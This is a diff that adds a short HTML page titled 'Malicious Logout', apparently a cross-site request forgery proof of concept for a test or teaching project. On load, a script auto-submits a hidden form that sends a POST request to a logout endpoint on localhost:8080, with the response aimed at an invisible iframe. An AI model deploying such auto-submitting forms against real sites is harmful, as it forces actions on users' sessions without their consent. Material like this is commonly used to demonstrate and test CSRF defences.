@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+  <head>
+	<title>Malicious Logout</title>
+  </head>
+  <body>
+
+    <iframe name="innerFrame"></iframe>
+
+    <form action="http://localhost:8080/logout" method="POST" target="innerFrame">
+    </form>
+
+    <script>
+      document.querySelector("form").submit();
+    </script>
+
+  </body>
+</html>
